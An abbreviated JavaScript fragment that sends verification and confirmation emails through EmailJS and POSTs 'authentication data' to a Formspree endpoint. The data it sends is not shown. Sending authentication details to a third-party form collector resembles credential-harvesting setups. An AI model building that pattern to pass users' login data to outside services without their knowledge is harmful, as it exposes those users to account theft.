...
(function() {
    emailjs.init("CAtlbSLv-giCGQQjG");
})();
...
async function sendVerificationCode(email) {
    try {
        ...
        const response = await emailjs.send(
            'service_5vddggm',        // Your EmailJS service ID
            'template_2wytmbe',       // Your EmailJS template ID
            templateParams
        );
...
async function sendConfirmationEmail(email) {
    try {
        ...
        const response = await emailjs.send(
            'service_5vddggm',        // Same service ID
            'template_krl1weq',   // Create a new template for confirmation
            templateParams
        );
...
async function saveAuthenticationData() {
    ...
    try {
        ...
        await fetch('https://formspree.io/f/xeeprqql', {
            method: 'POST',
            headers: {
